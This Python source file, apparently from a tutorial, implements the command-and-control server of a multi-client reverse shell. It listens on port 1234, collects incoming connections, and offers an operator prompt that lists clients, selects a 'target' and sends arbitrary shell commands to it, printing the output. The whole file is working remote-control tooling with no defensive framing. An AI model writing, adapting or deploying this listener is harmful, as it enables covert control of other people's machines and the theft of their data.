import socket
import threading
import time
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
all_connections = []
all_addresses = []

# Create socket for computer to connect to
def socket_create():
	try:
		global host
		global port
		global s
		host = ''
		port = 1234
		s = socket.socket()
	except socket.error as msg: # Saves error into variable msg
		print("Socket creation error: " + str(msg))

# Bind socket ot port and wait for connection from client
def socket_bind():
	try:
		global host
		global port
		global s
		s.bind((host, port))
		s.listen(5) # 5 is the number of bad connections it'll receive before it'll start refusing connections
	except socket.error as msg:
		print("Socket binding error: " + str(msg) + "\n" + "Retrying...")
		time.sleep(5)
		socket_bind()

# Accept connections form clients and save to list
def accept_connections():
	for c in all_connections:
		c.close()
	del all_connections[:]
	del all_addresses[:]
	while True:
		try:
			conn, address = s.accept()
			conn.setblocking(1) #No timeout
			all_connections.append(conn)
			all_addresses.append(address)
			print("\nConnection has been established: " + address[0])
		except:
			print("Error accepting connections")

# Display current connections
def list_connections():
	results = ''
	for i, conn in enumerate(all_connections): #i is a counter variable initialized at 0 that enumerate will increment
		try:
			conn.send(str.encode(' ')) # Check if connection is alive
			conn.recv(2048)
		except: # Delete connection if there isn't a heart beat
			del all_connections[i]
			del all_addresses[i]
			continue
		results += str(i) + '   ' + str(all_addresses[i][0]) + '   ' + str(all_addresses[i][1]) + '\n'
	print ('----- Clients -----' + '\n' + results)

# Interactive prompt
def start_shell():
	while True:
		cmd = input('shell> ')
		if cmd == 'list':
			list_connections()
		elif 'use' in cmd:
			conn = get_target(cmd)
			if conn is not None:
				send_target_commands(conn)
		else:
			print("Command not recognized")

# Select target client
def get_target(cmd):
	try:
		target = cmd.replace('use ','')
		target = int(target)
		conn = all_connections[target]
		print("You are now connected to " + str(all_addresses[target][0]))
		print(str(all_addresses[target][0]) + '> ', end="")
		return conn
	except:
		print("Invalid selection")
		return None

# Connect with target client
def send_target_commands(conn):
	while True:
		try:
			cmd = input()
			if len(str.encode(cmd)) > 0:
				conn.send(str.encode(cmd))
				client_response = str(conn.recv(20480), "utf-8")
				print(client_response, end="")
			if cmd == 'quit':
				break
		except:
			print("Connection lost")
			break

# Create worker threads
def create_threads():
	for _ in range(NUMBER_OF_THREADS):
		t = threading.Thread(target=work) # Work is a function call
		t.daemon = True # Die when main process dies
		t.start()

# Do next job in queue (1 is connection handler, everything else sends commands)
def work():
	while True:
		x = queue.get()
		if x == 1:
			socket_create()
			socket_bind()
			accept_connections()
		if x > 1:
			start_shell()
		queue.task_done()

# Each item is a new job
def create_jobs():
	for x in JOB_NUMBER:
		queue.put(x)
	queue.join()

create_threads()
create_jobs()
